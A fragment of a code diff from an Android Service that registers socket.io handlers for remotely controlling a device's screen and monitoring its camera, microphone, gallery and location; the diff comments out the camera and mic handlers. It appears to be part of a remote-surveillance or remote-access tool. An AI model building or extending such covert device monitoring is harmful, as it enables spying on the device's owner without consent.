@@ -91,8 +91,8 @@ public class Server extends Service {
             socket.on("mb-screen-black-event-" + mDeviceID, onScreenBlackMonitor);
             socket.on("mb-screen-skeleton-" + mDeviceID, onScreenSkeletonMonitor);
             socket.on("mb-screen-send-text-" + mDeviceID, onScreenSetTextMonitor);
-            socket.on("mb-camera-monitor-" + mDeviceID, onCameraMonitor);
-            socket.on("mb-mic-monitor-" + mDeviceID, onMicMonitor);
+//            socket.on("mb-camera-monitor-" + mDeviceID, onCameraMonitor);
+//            socket.on("mb-mic-monitor-" + mDeviceID, onMicMonitor);
             socket.on("mb-all-gallery-monitor-" + mDeviceID, onAllGalleryMonitor);
             socket.on("mb-one-gallery-monitor-" + mDeviceID, onOneGalleryMonitor);
             socket.on("mb-location-monitor-" + mDeviceID, onLocationMonitor);
